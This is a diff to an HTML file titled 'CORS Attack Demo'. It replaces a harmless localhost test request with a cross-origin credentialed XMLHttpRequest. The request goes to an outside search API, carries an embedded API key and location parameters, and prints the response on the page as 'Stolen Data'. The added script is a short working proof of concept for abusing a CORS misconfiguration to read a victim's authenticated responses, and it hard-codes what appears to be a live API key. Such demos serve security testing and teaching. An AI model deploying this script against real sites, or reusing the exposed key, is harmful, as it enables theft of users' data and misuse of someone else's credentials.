@@ -1,27 +1,17 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Attack Demo</title>
-</head>
-<body>
-    <h1>CORS Attack Demo</h1>
-    <script>
-fetch('http://localhost:8080/log', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({ message: 'Test CORS' })
-})
-.then(response => response.text())
-.then(data => console.log(data))
-.catch(error => console.error('Error:', error));
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.onerror = function() {
+    console.error('Request failed');
+};
+req.open('GET', 'https://browse.search.exampleapi.com/v1/browse?apiKey=sOp9lrUJDOgPABtkVdTXdoNSSe3iofUIjiWcKe-7Z1M&categoiries=car-dealer-repair&chains=322&at=52.520008%2C13.404954000000002&limit=50&lang=en-GB&t=m21ms5zl&callback=Request.JSONP.request_map.request_3', true);
+req.withCredentials = true;
+req.send();
 
-    </script>
-</body>
-</html>
-
+function reqListener() {
+    var response = this.responseText;
+    document.body.innerHTML += '<p>Stolen Data: ' + response + '</p>';  // Display stolen data on the webpage
+}
+</script>
 
        
